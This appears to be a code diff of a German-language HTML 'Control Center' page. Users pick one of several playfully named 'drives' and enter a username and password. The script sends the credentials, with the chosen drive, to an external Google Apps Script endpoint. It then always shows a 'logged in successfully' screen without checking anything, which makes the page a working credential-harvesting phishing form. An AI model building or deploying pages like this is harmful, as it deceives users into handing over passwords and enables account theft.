@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hyperdrive Control Center - Login</title>
+    <title>Drive Control Center</title>
     <style>
         * {
             margin: 0;
@@ -17,10 +17,64 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
         }
 
-        .container {
+        /* ── STARTSEITE ── */
+        #startView {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        #startView h1 {
+            color: #e6edf3;
+            font-size: 1.6em;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        #startView p {
+            color: #8b949e;
+            font-size: 0.9em;
+            margin-bottom: 36px;
+        }
+
+        .drive-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 16px;
+            max-width: 560px;
+        }
+
+        .drive-card {
+            background-color: #161b22;
+            border: 1px solid #21262d;
+            border-radius: 12px;
+            padding: 28px 16px;
+            cursor: pointer;
+            transition: border-color 0.2s, transform 0.15s;
+            text-align: center;
+        }
+
+        .drive-card:hover {
+            border-color: #388bfd;
+            transform: translateY(-2px);
+        }
+
+        .drive-card .icon {
+            font-size: 2em;
+            margin-bottom: 10px;
+        }
+
+        .drive-card .name {
+            color: #e6edf3;
+            font-size: 0.88em;
+            font-weight: 600;
+        }
+
+        /* ── LOGIN / ERFOLG ── */
+        .box {
+            display: none;
             width: 100%;
             max-width: 360px;
             padding: 40px 36px;
@@ -29,13 +83,30 @@
             border-radius: 12px;
         }
 
+        .back-btn {
+            background: none;
+            border: none;
+            color: #8b949e;
+            font-size: 0.85em;
+            cursor: pointer;
+            margin-bottom: 24px;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: color 0.2s;
+        }
+
+        .back-btn:hover {
+            color: #e6edf3;
+        }
+
         h1 {
             color: #e6edf3;
             font-size: 1.3em;
             font-weight: 600;
             text-align: center;
             margin-bottom: 28px;
-            letter-spacing: 0.5px;
         }
 
         .form-group {
@@ -88,7 +159,6 @@
 
         /* Erfolgs-Screen */
         .success-screen {
-            display: none;
             text-align: center;
         }
 
@@ -114,42 +184,113 @@
         .success-screen p {
             color: #8b949e;
             font-size: 0.88em;
+            margin-bottom: 24px;
+        }
+
+        .home-btn {
+            display: inline-block;
+            background: none;
+            border: 1px solid #30363d;
+            color: #8b949e;
+            padding: 8px 20px;
+            border-radius: 6px;
+            font-size: 0.85em;
+            cursor: pointer;
+            transition: border-color 0.2s, color 0.2s;
+        }
+
+        .home-btn:hover {
+            border-color: #8b949e;
+            color: #e6edf3;
         }
     </style>
 </head>
 <body>
-    <div class="container">
 
-        <!-- Login Formular -->
-        <div id="loginView">
-            <h1>Hyperdrive Login</h1>
-
-            <form id="loginForm">
-                <div class="form-group">
-                    <label for="username">Nutzername</label>
-                    <input type="text" id="username" placeholder="Nutzername eingeben" required autocomplete="off">
-                </div>
-
-                <div class="form-group">
-                    <label for="password">Passwort</label>
-                    <input type="password" id="password" placeholder="Passwort eingeben" required>
-                </div>
-
-                <button type="submit" class="btn">Anmelden</button>
-            </form>
+    <!-- STARTSEITE -->
+    <div id="startView">
+        <h1>Control Center</h1>
+        <p>Wähle deinen Drive</p>
+        <div class="drive-grid">
+            <div class="drive-card" onclick="openLogin('Hyperdrive', '🚀')">
+                <div class="icon">🚀</div>
+                <div class="name">Hyperdrive</div>
+            </div>
+            <div class="drive-card" onclick="openLogin('Bananendrive', '🍌')">
+                <div class="icon">🍌</div>
+                <div class="name">Bananendrive</div>
+            </div>
+            <div class="drive-card" onclick="openLogin('Eyridrive', '👁️')">
+                <div class="icon">👁️</div>
+                <div class="name">Eyridrive</div>
+            </div>
+            <div class="drive-card" onclick="openLogin('Sukukdrive', '🔮')">
+                <div class="icon">🔮</div>
+                <div class="name">Sukukdrive</div>
+            </div>
+            <div class="drive-card" onclick="openLogin('Chikennuggetdrive', '🍗')">
+                <div class="icon">🍗</div>
+                <div class="name">Chikennuggetdrive</div>
+            </div>
         </div>
+    </div>
 
-        <!-- Erfolgs-Screen -->
-        <div class="success-screen" id="successView">
+    <!-- LOGIN BOX -->
+    <div class="box" id="loginView">
+        <button class="back-btn" onclick="goHome()">← Zurück</button>
+        <h1 id="loginTitle">Login</h1>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username">Nutzername</label>
+                <input type="text" id="username" placeholder="Nutzername eingeben" required autocomplete="off">
+            </div>
+            <div class="form-group">
+                <label for="password">Passwort</label>
+                <input type="password" id="password" placeholder="Passwort eingeben" required>
+            </div>
+            <button type="submit" class="btn">Anmelden</button>
+        </form>
+    </div>
+
+    <!-- ERFOLGS-SCREEN -->
+    <div class="box" id="successView">
+        <div class="success-screen">
             <div class="success-icon">✓</div>
             <h2>Erfolgreich angemeldet</h2>
-            <p>Willkommen im Hyperdrive Control Center.</p>
+            <p id="successText">Willkommen im Control Center.</p>
+            <button class="home-btn" onclick="goHome()">← Zurück zur Startseite</button>
         </div>
-
     </div>
 
     <script>
         const SCRIPT_URL = "https://script.google.com/macros/s/AKfycby2NOHdi-_cbNv4q5cZxOQBHZmPPrQW9IXcJ-JYITJqhoYSPL-mxnNKssMuCMO-_rDdBQ/exec";
+
+        let currentDrive = "";
+
+        function showOnly(id) {
+            document.getElementById('startView').style.display  = 'none';
+            document.getElementById('loginView').style.display  = 'none';
+            document.getElementById('successView').style.display = 'none';
+
+            const el = document.getElementById(id);
+            el.style.display = id === 'startView' ? 'block' : 'block';
+            if (id !== 'startView') el.style.display = 'block';
+        }
+
+        function openLogin(driveName, icon) {
+            currentDrive = driveName;
+            document.getElementById('loginTitle').textContent = icon + ' ' + driveName + ' Login';
+            document.getElementById('loginForm').reset();
+            showOnly('loginView');
+            document.getElementById('loginView').style.display = 'block';
+            document.getElementById('startView').style.display = 'none';
+        }
+
+        function goHome() {
+            document.getElementById('startView').style.display  = 'block';
+            document.getElementById('loginView').style.display  = 'none';
+            document.getElementById('successView').style.display = 'none';
+        }
 
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault();
@@ -161,13 +302,16 @@
                 method: 'POST',
                 mode: 'no-cors',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ username: user, password: pass })
+                body: JSON.stringify({ drive: currentDrive, username: user, password: pass })
             });
 
-            // Login-Ansicht ausblenden, Erfolgs-Screen anzeigen
-            document.getElementById('loginView').style.display = 'none';
+            document.getElementById('successText').textContent =
+                'Willkommen im ' + currentDrive + ' Control Center.';
+
+            document.getElementById('loginView').style.display   = 'none';
             document.getElementById('successView').style.display = 'block';
         });
     </script>
+
 </body>
 </html>
